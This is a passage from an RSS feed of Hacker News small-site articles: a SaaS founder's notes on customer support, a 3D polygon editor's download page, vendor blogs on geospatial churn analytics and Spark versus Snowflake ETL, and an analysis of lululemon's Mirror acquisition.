<p>After a marketing push, let’s say a product launch, I will see an immediate increase in signups lasting about 3 days and then slowly trailing off.</p>

<p>Over the next few days, I’ll start hearing from these new users via support tickets. I prioritize responding to them and I get to work. Showing these users that I’m committed to improving Lunch Money based on their feedback is a great and honest sales tactic.</p>

<p>About 3 days before the initial wave of user trials ends, I wrap up my engineering sprint and send out a newsletter detailing the latest features and improvements. This re-enforces to new users that the product is under continuous development.</p>

<p>Finally, I have a drip campaign that automatically notifies users a few days before their trial expires and on the actual date of expiry. This period of time is when I typically see most users convert 🤞.</p>



<p>I used to think that if I were to hire someone, it would first be a customer support agent but I’ve since been moving away from that idea. Users are constantly surprised (in a good way!) when they realize the founder is responding to their bug reports or feature requests directly.</p>

<p><strong>Consistently providing great customer support is a long-term investment for Lunch Money</strong> as it is undoubtedly a great way to turn customers into champions. As I receive and respond to support tickets, I’m also able to identify and overhaul the common sources of trouble for users.</p>

<p>I’ve always believed that customer support would be the most important and the hardest part of the business to scale, especially if I have the goal of staying a company of one.</p>

<p>Corroborating data from <a href="https://emailmeter.com/">EmailMeter</a> and my database, it seems my changes are making a difference. Despite a growing user base, inbound support emails remain fairly steady!</p>

<p><img src="https://lunchbag.ca/uploads/screen-shot-2020-05-21-at-4-20-15-pm.png"><span>Handling support on my own should be sustainable at least for the foreseeable future!</span></p>

<h2 id="how-do-support-tickets-work-at-lunch-money">How do support tickets work at Lunch Money?</h2>

<p>A feedback button is located at the bottom right corner of every page. Clicking on it opens up a text area wherein users can submit feature requests, questions, bug …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lunchbag.ca/company-of-one">https://lunchbag.ca/company-of-one</a></em></p>]]>
            </description>
            <link>https://lunchbag.ca/company-of-one</link>
            <guid isPermaLink="false">hacker-news-small-sites-23840321</guid>
            <pubDate>Wed, 15 Jul 2020 01:48:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Polygon Crest – open-source 3D polygonal editor]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23839480">thread link</a>) | @app4soft
<br/>
July 14, 2020 | http://ysflight.in.coocan.jp/polygoncrest/e.html | <a href="https://web.archive.org/web/*/http://ysflight.in.coocan.jp/polygoncrest/e.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div bordercolor="#111111" width="100%" id="AutoNumber1">
        <tbody><tr>
          <td>
          
          <h2>
            What's Polygon Crest?</h2>
          <p>
            This program is a polygon editor. Maybe more commonly called a 
			polygon modeler. You can call whichever comfortable for you. The 
			main purpose is to build aircraft and ground visual models for YS 
			FLIGHT SIMULATOR, but you can use it for making general polygonal 
			models. If you make a correct solid model, you can export the data 
			for 3D printing, for example. I wanted to make it easy to create 
			aircraft models, so this program can quickly make a popular 
			airfoils, and extrude along the wing leading and trailing edges. It 
			also has basic boolean operations and rounding functions as well.
            </p>
		  <p>
            <a href="http://ysflight.in.coocan.jp/polygoncrest/scrnshot/cessna172-english.png">
			<img height="170" src="http://ysflight.in.coocan.jp/polygoncrest/scrnshot/cessna172-english_small.png" width="320" xthumbnail-orig-image="scrnshot/cessna172-english.png"></a></p>
		  <h2>
            How to use?</h2>
		  <p>
            Usage can be found in the following URLs.</p>
		  <p>
            <a href="http://polycre.help.en.ysflight.com/">
			<strong>http://polycre.help.en.ysflight.com/</strong></a> (English)</p>
		  <p>
            <a href="http://polycre.help.jp.ysflight.com/">
			<strong>http://polycre.help.jp.ysflight.com/</strong></a> (Japanese)</p>
		  <h2>
            Donations are welcome</h2>
		  <p>
            Polygon Crest is a fre and open-source program.&nbsp; Therefore, you can 
			use it for free of charge.&nbsp; However, I appreciate if you donate some 
			money for supporting the development.&nbsp; For making donation, please 
			send some money via PayPal using the following button.
            </p>
		  
<!--webbot bot="HTMLMarkup" endspan i-checksum="11026" -->
		  <p>
            I will use the donated money for upgrading my developing 
			environment, buying books for learning new programming techniques, 
			maintaining and adding contents in YSFLIGHT.COM.&nbsp; Thank you for your 
			support!
            </p>
		  <h2>
            Download</h2>
		  <p>
            <strong>Version 20150329</strong></p>
		  <p>
            <strong>
			<a href="http://download.cnet.com/Polygon-Crest/3000-6677_4-76169623.html">[For MacOSX 
			&amp; Linux]</a> (Linux binary is also included in the Mac OSX 
			package.)</strong></p>
		  <p>
            <strong>
			<a href="http://download.cnet.com/Polygon-Crest-for-Windows/3000-6677_4-76170331.html">[For Windows]</a></strong></p>
		  <h2>
            Updates</h2>
          <p>
          <strong>2016/02/21</strong></p>
		  <ul>
			  <li>Digitally signed Mac OSX binary.&nbsp; You should be able to 
			  run the program without warning.&nbsp; If your setting only allows 
			  App Store applications, you will need to change the security 
			  setting to allow App Store &amp; digitally signed by known developers 
			  (or something like that.)</li>
			  <li>Linux binary is bundled in the Mac OSX package.&nbsp; You can 
			  run LinuxInstaller.py in the zip file, which will create an icon 
			  on the desktop.&nbsp; If it works well, I'm going to do the same 
			  for YSFLIGHT.</li>
			  <li>Now YSFLIGHT shares the same data structure of dynamic model 
			  (.DNM) with PolygonCrest.&nbsp; From the next version on, if you 
			  can open the .DNM file with PolygonCrest, it should (is supposed 
			  to) appear the same in YSFLIGHT.</li>
			  <li>Imprinting:&nbsp; You can imprinting a polygon or a constraint 
			  edge to a nearby polygons by selecting a polygon and then select 
			  Edit-&gt;Projection-&gt;Imprinting.</li>
			  <li>Sewing:&nbsp; You can select two vertices and select 
			  Edit-&gt;Local Operations-&gt;Sew between two vertices.&nbsp; Vertices 
			  will be created between the selected vertices and polygons along 
			  the path will be split.</li>
		  </ul>
		  <p>
          <strong>2015/05/23</strong></p>
		  <ul>
			  <li>Polygon Crest for Linux: You can really use the system 
			  clipboard.&nbsp; (Now it's closed inside Polygon Crest program)</li>
			  <li>Input/Output of Wavefront .OBJ format files.</li>
			  <li>Add "Recently Used Files"</li>
			  <li>Color Palette dialog.</li>
			  <li>Polygon Crest for Windows: Erased a false error message on 
			  start up.&nbsp; (It only appeared when I build in a release 
			  configuration, and I didn't notice :-P)</li>
		  </ul>
		  <p>
          <strong>2014/07/19</strong></p>
		  <p>
          First release!&nbsp; Version 20140716.&nbsp; I wanted to add more 
		  features.&nbsp; But, if I wait until I finish all the features that I 
		  want to add, it's going to take infinity.&nbsp; I decided to make it 
		  open now.&nbsp; I'll keep developing and newer versions will be 
		  available.</p>
          
          </td>
        </tr>
        </tbody></div></div>]]>
            </description>
            <link>http://ysflight.in.coocan.jp/polygoncrest/e.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23839480</guid>
            <pubDate>Tue, 14 Jul 2020 23:42:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cutting user churn for world's fastest-growing bike-share startup]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23838768">thread link</a>) | @dasickis
<br/>
July 14, 2020 | https://blog.locale.ai/how-indias-top-micro-mobility-player-used-locale-ai-to-reduce-user-churn-by-9/ | <a href="https://web.archive.org/web/*/https://blog.locale.ai/how-indias-top-micro-mobility-player-used-locale-ai-to-reduce-user-churn-by-9/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.locale.ai/content/images/size/w300/2020/07/SAE_IT--1-.jpg 300w,
                            https://blog.locale.ai/content/images/size/w600/2020/07/SAE_IT--1-.jpg 600w,
                            https://blog.locale.ai/content/images/size/w1000/2020/07/SAE_IT--1-.jpg 1000w,
                            https://blog.locale.ai/content/images/size/w2000/2020/07/SAE_IT--1-.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.locale.ai/content/images/size/w2000/2020/07/SAE_IT--1-.jpg" alt="How India's Top Scooter Sharing Player Used Locale.ai to Reduce User Churn by 9%">
            </figure>

            <section>
                <div>
                    <h2 id="an-introduction-to-our-partner-">An introduction to our Partner:</h2><p>Locale recently worked with a scooter sharing company that helps users commute using their fleet of scooters and bikes. With their rapid growth, large user base, and wonderful review, they have become the face of the growing micro-mobility ecosystem in South Asia. In 2019, they reached a significant milestone of 60,000 rides per day in Bengaluru, making it the fastest-growing bike-sharing start-up in the world. </p><p>Let us take you through how the team<strong><strong> </strong></strong>used <strong><strong><a href="https://locale.ai/">Locale.ai</a> </strong></strong>to open their stations in 7 cities as part of a new initiative by the company, decrease user churn by 9% and attain operational efficiency.</p><h2 id="the-business-problem-s-">The Business Problem(s)</h2><p>To make any important operational decision using geo-data, executives and decision makers have to rely on the data provided by the engineering teams. The case was very similar with our partner too. Their business model was a docked model- where any user (like you or me) could pick up a bike from a station and drop it off to another station.</p><p>As they were rapidly expanding in new cities (pre-COVID), the business problems were to:</p><ul><li>Decide where to open new stations to service demand</li><li>Close stations that were not performing well</li></ul><figure><img src="https://blog.locale.ai/content/images/2020/06/OperationalInsights-1.png"><figcaption>Locale.ai Console</figcaption></figure><p><br>The team wanted to ensure that they could capitalize on latent demand present in certain areas and expand their presence as well as minimise user churn by getting better insights into user behaviour and making a strategy accordingly.</p><p>Meanwhile, they were also trying to ensure that the time and resources in building dashboards could be used in some other avenue so that they could grow more rapidly. That’s where they were looking for a tool to convert location data into insights that can aid business decisions.</p><h3 id="before-we-move-on-a-bit-about-locale-ai">Before we move on, a bit about Locale.ai</h3><p>Locale is your one-stop destination for anything that involves analyzing hyperlocal operations. Imagine a tool built for city teams, ops teams &amp; logistics teams empowering them to get answers to their questions without depending on any engineering or analyst bandwidth.</p><p>We ensure that a large chunk of location data collected from your users or your vehicle sensors, that might otherwise remain unused, can now be used to create meaningful insights that help business teams make quick, data-driven decisions.</p><h2 id="the-how-s-why-s-of-the-solution">The How's &amp; Why's of the Solution</h2><p>The questions that the team asked to make the following decisions:</p><h3 id="expansion-new-stations">Expansion &amp; New Stations</h3><ul><li>Which areas are users downloading the app or searching for bikes?</li><li>Which areas are users churning out [searching but not booking]?</li><li>What is the distance of areas with high churn density with current stations?</li></ul><figure><img src="https://blog.locale.ai/content/images/2020/06/New-Static-Entity-overview.png"><figcaption>Locale.ai: Station Console</figcaption></figure><h3 id="shutting-down-stations"><strong><strong>Shutting Down Stations</strong></strong></h3><ul><li>Which stations are usually facing a high rate of cancellations?</li><li>Which stations have a very high idle time for the bikes?</li><li>Which stations are located near low demand areas?</li></ul><h3 id="making-insights-actionable">Making Insights Actionable</h3><p>At Locale, we consider ourselves successful only when we help companies take more precise and data-driven decisions using our product. So, we are always on the lookout for making these insights more actionable.</p><p>To read more on this, check this out:‌</p><figure><a href="https://blog.locale.ai/how-were-building-our-geospatial-analytics-product-using-first-principles-2/"><div><p>How we’re building our geospatial analytics product using first principles</p><p>Our philosophy on analytics at Locale!</p><p><img src="https://blog.locale.ai/favicon.png"><span>The Locale.ai Blog</span></p></div><p><img src="https://blog.locale.ai/content/images/2020/01/0.png"></p></a></figure><p>With our partner for instance, the central ops team could just right click and get the lat-long of the prospective location. They would send a couple of these lat-longs to their individual city teams who would find the most optimal location on ground, owing to the constraints.</p><p>With our commenting feature, they would coordinate internally on whether the station was opened in that location. If not, what were the possible reasons?</p><h3 id="the-impact">The Impact</h3><p>But, with all these decisions, what was the actual business impact and how did we move business metrics?</p><blockquote>Since the team started using our product, we saw a 9% reduction in user churn and improvement in user satisfaction.</blockquote><p>What this translates to is users who could previously not book a bike because of unavailability of bikes, or bikes being far off can now hop on a nearby bike and start their rides, which resulted in an improvement in user delight.</p><hr><h2 id="the-use-cases-of-locale-in-micro-mobility-">The Use Cases of Locale in Micro-Mobility:‌‌</h2><figure><img src="https://blog.locale.ai/content/images/2020/07/image-6.png"></figure><p>Analysts at McKinsey have evaluated the shared micro mobility industry to cross over <a href="https://www.mckinsey.com/industries/automotive-and-assembly/our-insights/micromobilitys-15000-mile-checkup#">$300 Billion by 2030</a>. But how can companies today reach there? What stops companies from realizing their potential? Inertia in expanding to newer locations? Problems with fleet management? Inaccuracy in gauging demand? A mixture of all these problems often cap the growth of a company.</p><p>Let us explore these problems one by one.</p><ol><li><strong><strong>Expansion</strong></strong>: Metrics such as user bookings, cancellations, distribution of sales and churn helps companies understand the spread of demand and supply across cities.</li><li><strong><strong>Station Performance:</strong></strong> Idle time of bikes, churn density around the stations and cancellations help companies decide where to set up new stations and which stations to shut down.</li><li><strong><strong>User Acquisition:</strong></strong> It is important to understand the behaviour of frequent users, which routes they travel and how they can increase user acquisition along those routes via targeted offline and route-based campaigns.</li><li><strong><strong>Fleet Management:</strong></strong> Issues such as vandalism, incomplete drop-offs, and breakdowns need to be tracked in real time and it helps companies to get immediate notifications for abnormal behaviour of KPIs.‌‌</li></ol><p>Often, companies search for tools that can be used to solve these problems for them, by using their location data. Luckily, that's exactly what we love to do!‌‌ If you work in the micro-mobility or ride-sharing industry, contact us to set up your Locale today. ‌‌</p><p><em><em><em><em>To know more, g<em><em><em><em>et in touch with me on </em></em></em></em></em></em></em></em><a href="https://www.linkedin.com/in/aditi-sinha-6b774ba9/" rel="noopener nofollow"><em><em><em><em><em><em><em><em>LinkedIn</em></em></em></em></em></em></em></em></a><strong><strong><strong><strong><strong><strong><strong><strong><em><em><em><em><em><em><em><em> </em></em></em></em></em></em></em></em></strong></strong></strong></strong></strong></strong></strong></strong><em><em><em><em><em><em><em><em>or </em></em></em></em></em></em></em></em><a href="https://twitter.com/aditi1002" rel="noopener nofollow"><em><em><em><em><em><em><em><em>Twitter</em></em></em></em></em></em></em></em></a><strong><strong><strong><strong><strong><strong><strong><strong><em><em><em><em><em><em><em><em>.</em></em></em></em></em></em></em></em></strong></strong></strong></strong></strong></strong></strong></strong></p><h3 id="read-similar-">Read Similar:</h3><figure><a href="https://blog.locale.ai/how-micromobility-used-locale-ai-to-reduce-user-churn/"><div><p>How India’s Top Micro-Mobility Player Used Locale.ai to Reduce User Churn by 9%</p><p>A step-by-step guide on how they used Locale.ai to set up their stations</p><p><img src="https://blog.locale.ai/favicon.png"><span>Aditi Sinha</span><span>The Locale.ai Blog</span></p></div><p><img src="https://blog.locale.ai/content/images/2020/07/SAE_IT.jpg"></p></a></figure><figure><a href="https://blog.locale.ai/mapping-kpis-with-location-data-for-ride-hailing-companies-using-locale-ai/"><div><p>Key Metrics for Ride-Hailing Companies using Location Data</p><p>Use location intelligence to create heatmaps for your critical business&nbsp;metrics with Locale</p><p><img src="https://blog.locale.ai/favicon.png"><span>Aditi Sinha</span><span>The Locale.ai Blog</span></p></div><p><img src="https://blog.locale.ai/content/images/2020/05/1_C0WaSy2Lt-sdpynFMI8j4A.png"></p></a></figure>
                </div>
            </section>





        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.locale.ai/how-indias-top-micro-mobility-player-used-locale-ai-to-reduce-user-churn-by-9/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23838768</guid>
            <pubDate>Tue, 14 Jul 2020 22:22:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spark vs. Snowflake: The Cloud Data Engineering (ETL) Debate]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23838750">thread link</a>) | @ibains
<br/>
July 14, 2020 | https://www.prophecy.io/blogs/spark-vs-snowflake-the-cloud-data-engineering-etl-debate | <a href="https://web.archive.org/web/*/https://www.prophecy.io/blogs/spark-vs-snowflake-the-cloud-data-engineering-etl-debate">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Data Integration is a critical engineering system in all Enterprises. Initially, it started with ad hoc <strong>scripts</strong>, which got replaced by <strong>Visual ETL</strong> tools such as Informatica, AbInitio, DataStage, and Talend. To cope with an explosion in data, consumer companies such as Google, Yahoo, and LinkedIn developed new <strong>data engineering</strong> systems based on commodity hardware. The usability of these systems was quite low, and the developer needed to be much more aware of the performance. <strong>Apache Spark</strong> has broken through from this clutter with thoughtful interfaces and product innovation, while <strong>Hadoop</strong> has effectively gotten <strong>disaggregated</strong> in the cloud and become a legacy technology.</p><p>Now, as Enterprises transition to the cloud, often they are developing expertise in the cloud ecosystem at the same time as trying to make decisions on the product and technology stack they are going to use. </p><p>In the rest of the blog, we'll take a look at the two primary processing paradigms for data integration, and their cloud equivalents.</p></div><h2>What is Data Integration (or ETL)</h2><p>Data Integration is your Data Factory. It reads data from various <strong>input sources</strong> such as Relational Databases, Flat Files, and Streaming. It then does various <strong>transformations</strong> on the data such as joining and de-duplicating data, standardizing formats, pivoting, and aggregating. Once the data is ready for analytics (such as in star schemas), it is <strong>stored or loaded</strong> into the target which is typically a Data Warehouse or a Data Lake.</p><p><img src="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a891eba4f265f06523789_ETL%20%20graphic.png" srcset="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a891eba4f265f06523789_ETL%2520%2520graphic-p-1080.png 1080w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a891eba4f265f06523789_ETL%2520%2520graphic-p-1600.png 1600w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a891eba4f265f06523789_ETL%20%20graphic.png 1755w" sizes="(max-width: 479px) 87vw, (max-width: 991px) 92vw, 780px" alt=""></p><h2>The Two On-Premises Execution Paradigms</h2><p>For most large Enterprises and companies rich in data, &nbsp;one server will be insufficient to execute the workloads, and thus, parallel processing is required. For this, there have historically been two primary methods:</p><ul role="list"><li><strong>ETL Execution Engine Processing</strong> - here the ETL tool comes with a distributed high performance execution engine. Most of the processing happens in this execution engine, and after the data is ready for analytics, it is loaded into a data warehouse. <strong>AbInitio</strong> is a good example and is the market leader in performance.</li><li><strong>Data Warehouse Pushdown Processing</strong> - here the ETL tool comes with a single server execution engine. Since it cannot do high volume processing, it provides pushdown processing that pushes computations down to the Data Warehouse and leverages the distributed processing engine there. In the field, we see <strong>Informatica</strong> commonly deployed with <strong>Teradata</strong> this way, though Informatica has a PowerCenter Grid product as well.</li></ul><p><img src="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%20execution%20graphic.png" srcset="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%2520execution%2520graphic-p-500.png 500w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%2520execution%2520graphic-p-800.png 800w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%2520execution%2520graphic-p-1080.png 1080w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%2520execution%2520graphic-p-1600.png 1600w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%20execution%20graphic.png 1773w" sizes="(max-width: 479px) 87vw, (max-width: 991px) 92vw, 780px" alt=""></p><p>Two on-premises ETL Execution paradigms</p><h3>Which Architecture is Better?</h3><div><p>One natural question to ask is - <strong>whether one of these paradigms is preferable?</strong> The Answer is Yes!</p><p>The case for <strong>data warehouse ETL execution</strong> is that it reduces one system - ETL execution and data warehouse execution will both happen in Teradata. Also, most data warehouses are typically high-quality products. However, it's an <strong>expensive</strong> approach and <strong>not the right architectural fit</strong>. Data warehouses have an architectural focus on <strong>low latency</strong> since there is often a human analyst waiting for her BI query. For this, they collect high-quality statistics for query planning and have sophisticated caching mechanisms. This is not a great fit for ETL workloads where throughput is the most important factor, and there is no reuse, making caches and statistics useless. Often we've found that 70% of Teradata capacity was dedicated to ETL in Enterprises, and that is what got offloaded to Apache Hive. </p><p>On the other hand, high-quality parallel processing products, exemplified by AbInitio are perhaps the <strong>best solution</strong> - both in inherent processing cost and performance. Most users of AbInitio loved the product, but the high licensing cost has removed any architectural cost advantages they had and made them available to a very few of the largest Enterprises. </p><p>‍<strong>Cloud, with usage based pricing,</strong> is a great equalizer, let's look at how cloud is changing this equation...</p></div><h2>Cloud Transition - the two ETL Architectures</h2><p>There are two primary approaches to choose for your ETL or Data Engineering</p><ul role="list"><li><strong>Data Warehouse ETL Approach: </strong>This is an <strong><em>as-is</em></strong> migration of the on-premises approach, done in a cloud context. An example here, one can use <strong>Snowflake</strong> as the data warehouse instead of <strong>Teradata</strong> on-premises. Then you can use any ETL tool such as <strong>Informatica</strong> or <strong>Matillion</strong> on top and it will push down queries to Snowflake that will do the heavy lifting. If you have small datasets, this works. As discussed above, for large datasets and complex transformations this architecture is far from ideal. This is far from the world of open-source code on Git &amp; CI/CD that data engineering offers - again locking you into proprietary formats, and archaic development processes.</li><li><strong>Data Engineering Approach:</strong> Data Engineering based on Spark for the execution layer, merges the best of the previous generation in high performance, with the best of large scale commodity processing from consumer companies - such as Hadoop. If you use Databricks, it adds transactions from Data Warehouses via delta lake providing the best product in the cloud by a large margin. A product such as <strong>Prophecy</strong> adds the remaining functionality - code and visual drag-and-drop editing that generates code on Git, Metadata with lineage, Scheduling, and CI/CD, providing a complete stack that will free you from proprietary formats.</li></ul><div><p>The following image is how the Cloud Data Engineering architecture looks. The data from on-premise operational systems lands inside the data lake, as does the data from streaming sources and other cloud services. <strong>Prophecy with Spark</strong> runs data engineering or ETL workflows, writing data into a data warehouse or data lake for consumption.</p><p>Reports, Machine Learning, and a majority of analytics can run directly from your Cloud Data Lake, saving you a lot of costs and making it the single system of record. For particular BI use cases (fast interactive queries), Data Marts can be created on Snowflake or another Cloud Data Warehouse such as Redshift, BigQuery, or Azure SQL.</p></div><p><img src="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture.jpg" srcset="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture-p-500.jpeg 500w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture-p-1080.jpeg 1080w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture-p-1600.jpeg 1600w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture-p-2000.jpeg 2000w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture.jpg 2423w" sizes="(max-width: 479px) 87vw, (max-width: 991px) 92vw, 780px" alt=""></p><p>Cloud Data Engineering Architecture</p><h2>How to Choose?</h2><p>If you're moving you ETL to Data Engineering, you're deciding what your architecture for the next decade or more.</p><p>We recommend moving to Apache Spark and a product such as Prophecy. Apart from exceeding the capabilities of the Snowflake based stack at a much cheaper price point, this prevents you from getting locked into proprietary formats. You will also be able to deliver new analytics faster by embracing Git and continuous integration and continuous deployment - that is equally accessible to the Spark coders as well as the Visual ETL developers who have a lot of domain knowledge.</p></div></div>]]>
            </description>
            <link>https://www.prophecy.io/blogs/spark-vs-snowflake-the-cloud-data-engineering-etl-debate</link>
            <guid isPermaLink="false">hacker-news-small-sites-23838750</guid>
            <pubDate>Tue, 14 Jul 2020 22:20:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Breaking Down Lululemon's $500M Mirror Acquisition]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 24 (<a href="https://news.ycombinator.com/item?id=23838564">thread link</a>) | @Cpevans
<br/>
July 14, 2020 | https://insider.fitt.co/issue-no-87-why-mirror-sold/ | <a href="https://web.archive.org/web/*/https://insider.fitt.co/issue-no-87-why-mirror-sold/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-content">
			<div>
				<div>
					<section>
						<p>A few weeks back, lululemon acquired Mirror for $500M. When the news broke, we wrote&nbsp;<a href="https://insider.fitt.co/lululemon-acquires-mirror-500m/" target="_blank" rel="noopener">a quick analysis</a>&nbsp;of how the partnership might play out. Today, we’re going deeper to explore lulu’s ambitions, Mirror’s motivation for selling, and how, in hindsight, Nike, Peloton, and COVID-19 sealed the deal.</p>
<p><strong>TL;DR:</strong>&nbsp;Even if this acquisition doesn’t pan out, everybody wins. Here’s why.</p>
					</section>

          <section>
						      <div>
        <div>
                      <h2>Calculated Risk</h2>
          
          <p>M&amp;A is a mixed bag. In the case of activewear retailers, buying into digital fitness via high-profile purchases has&nbsp;<a href="https://twitter.com/JoeVennare/status/1281301589190488064" target="_blank" rel="noopener">proven futile</a>. So why did lululemon, a fast-growing apparel company, roll the dice on Mirror? One word: Nike.</p>
<p>Nike is the king of activewear. Try as they might, foes like adidas, Reebok, and Under Armour are no match for the swoosh. For its part, lululemon hopes to become a worthy adversary — if for no other reason than to remain in the good graces of Wall Street. On both accounts, Mirror factors heavily into the equation.</p>
<p>Putting this competition into context, lululemon trails Nike by an order of magnitude. Nike has a $152B market cap. Over the last 12 months, they’ve done $37B in sales. Meanwhile, lulu’s market cap is $37B, and the company had revenues of $3.85B over the same period.</p>
<p>While shares of the yoga pant maker have outperformed Nike in recent years, lulu might not ever reach the scale of Nike. But beating Nike outright isn’t the point. Ultimately, lululemon is in competition with itself, where Nike represents the upper bounds of what’s possible.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Just Keep Growing</h2>
          
          <p>To prove that they haven’t peaked, lululemon has one mandate: just keep growing.</p>
<p>Moving beyond the yoga niche and expanding its total addressable market, the company’s&nbsp;<a href="https://us15.campaign-archive.com/?u=4c6bc12e271bc681951ed945a&amp;id=96471d02c6" target="_blank" rel="noopener">five-year strategic plan</a>, released in April 2019, charted the path forward: “double men’s, double digital, and quadruple international” revenues. Add self-care products, a foray into footwear, and the opening of a 20,000-square-foot experiential store (complete with yoga studios and a restaurant) into the mix and grow they shall.</p>
<p>A few months later, in November of 2019, lululemon invested $1M into Mirror’s $34M Series B-1, a bargain for a foothold in connected fitness. As part of the investment, and in keeping with its goal of becoming an experiential brand, lululemon ambassadors began creating workout content for the Mirror platform.</p>
<p>Flash-forward to March: when COVID hit, the table was set. With retail stores shuttered and fitness studios closed, shopping and sweating moved online. In a few short weeks, lululemon had seen enough; they were ready to go all-in on Mirror.</p>
<ul>
<li>In the first week of store closures, 170K people joined lulu’s live workouts on Instagram.</li>
<li>Pre-COVID, 64% of lululemon guests used a digital workout option at home.</li>
<li>During the pandemic, as the coronavirus spread, that number jumped to 75%.</li>
<li>86% of lulu customers who used an at-home option during the outbreak plan to continue or increase their new digital workout habit.</li>
</ul>
<p>In April, lulu’s online sales surged&nbsp;<a href="https://www.cnbc.com/2020/06/11/lululemon-lulu-reports-fiscal-q1-2020-earnings.html" target="_blank" rel="noopener">125%</a>, a trend that’s expected to continue. Add in the fact that some 50% of Mirror users are also lululemon customers, and this deal checks a lot of boxes for the growth-focused retailer.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Why Mirror Sold</h2>
          
          <p>Last year, Mirror CEO Brynn Putnam told Fast Company she was building “the next iPhone.” Far from another connected fitness upstart, Mirror would be “the third screen in your life that you’re going to turn to for all immersive interactive experiences going forward.”</p>
<p>About seven months later, Putnam pulled the ripcord, selling her company amid a global pandemic — circumstances tailor-made for an immersive third screen.</p>
<p>So why did Mirror sell? lulu made an offer they couldn’t refuse. Putnam, a solo, female founder just secured a “W” for herself, her investors, and New York’s startup scene.</p>
<p>Beyond the obvious, it’s fair to ask,&nbsp;<em>why now?</em>&nbsp;In many ways, Peloton forced Putnam’s hand.</p>
<p>Pitching Mirror as the “next iPhone” was a strategic move that 1.) established a big vision worthy of $70M+ in funding, and 2.) helped the company duck the question, “how do you compete with Peloton?” Their answer was simple — we don’t.</p>
<p>When COVID hit, Mirror was pigeonholed. They weren’t the third screen, they were in direct competition with Peloton. And despite surging sales, Mirror’s growth pales in comparison to Peloton’s. Plus, there’s&nbsp;<a href="https://www.linkedin.com/posts/joevennare_fitness-startups-activity-6679025786697117697-YuI5" target="_blank" rel="noopener">a growing list of Mirror-like competitors</a>&nbsp;hitting the market. All of a sudden, an interactive screen didn’t feel all that innovative, or defensible.</p>
<p>Meanwhile, digital fitness companies are raking in funding. Hydrow, Aaptiv, and NEOU recently closed investments as Tonal and Tempo target new funds. If Mirror considered raising on the back of its COVID boost, they’d have to become a customer acquisition and retention machine, where every move is audited in relation to Peloton’s now public (and soaring) metrics.</p>
<p>In the end, joining forces with lululemon was more compelling than slugging it out with Peloton or adhering to the “third screen” narrative.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Lulu x Mirror</h2>
          
          <p>Upon announcing the deal, lululemon’s stock jumped, and onlookers have been quick to heap on the praise.</p>
<p>According to Bank of America analysts, Mirror could generate&nbsp;<a href="https://www.marketwatch.com/amp/story/lululemon-acquisition-mirror-could-generate-700-million-and-reach-600000-subscribers-by-2023-bank-of-america-2020-07-01" target="_blank" rel="noopener">$700M</a>&nbsp;in revenue and reach 600,000 subscribers by 2023.</p>
<p>To realize this lofty forecast, lululemon will sell Mirrors to its existing customer base, starting with its 489 corporate-owned stores across the globe. The retailer will continue creating content for the platform, where Mirror instructors will be clad in lululemon gear. More than simply selling more apparel, Mirror’s ability to generate recurring revenue and strengthen lulu’s relationship with consumers is the chief aim of this acquisition.</p>
<p>While the hard work of transforming an athleisure retailer into a tech company is just beginning, it will be difficult to criticize lululemon for shooting this shot. Whether or not they can keep growing will be the question on everyone’s mind:</p>
<p><em>“Lulu is showing no signs of slowing down, but acquisitions made outside a retailer’s core skill set have rarely been seamless. There is nothing bad about the story right now. The scariest thing [for investors] about Lulu is, is this as good as it gets?”</em>&nbsp;– Simeon Siegel, managing director &amp; senior retail analyst at BMO Capital Markets.</p>
<hr>
        </div>
      </div>

            <div>
        <div>
                      <h2>💻 Closing the Gap </h2>
          
